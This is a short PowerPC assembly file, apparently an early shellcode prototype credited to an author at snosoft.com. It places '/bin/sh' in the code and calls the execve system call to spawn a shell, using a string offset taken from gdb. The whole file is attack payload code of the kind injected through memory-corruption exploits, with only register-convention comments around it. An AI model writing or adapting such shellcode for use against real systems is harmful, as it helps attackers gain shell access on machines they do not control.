# r0 is used for epilog / prolog code
# r1 is stack pointer 
# r3 - r10 1st - 8th fixed point paramaters
# r11 is the enviornment pointer
# r12 is for global linkage routines
# r13 - r31 must be preserved throughout function calls
# code by dotslash@snosoft.com

.data
.text
.globl main 
.globl shell
main:
  stwu    %r1,-16(%r1)
  mflr    %r0   
  stw     %r31,12(%r1)     
  stw     %r0,20(%r1)   
  mr      %r31,%r1   
  .string "/bin/sh"
  bl      shell
  lwz     %r11,0(%r1)
  lwz     %r0,4(%r11)  
  mtlr    %r0   
  lwz     %r31,-4(%r11) 
  mr      %r1,%r11   
  blr    

shell:
  mflr    %r3
# use addi to find the offset of your string in memory
#  addi    %r3,%r3,-12
  addi    %r3,%r3,-40                     # hack from gdb output
  li      %r5,0
  li      %r0,11 
  sc
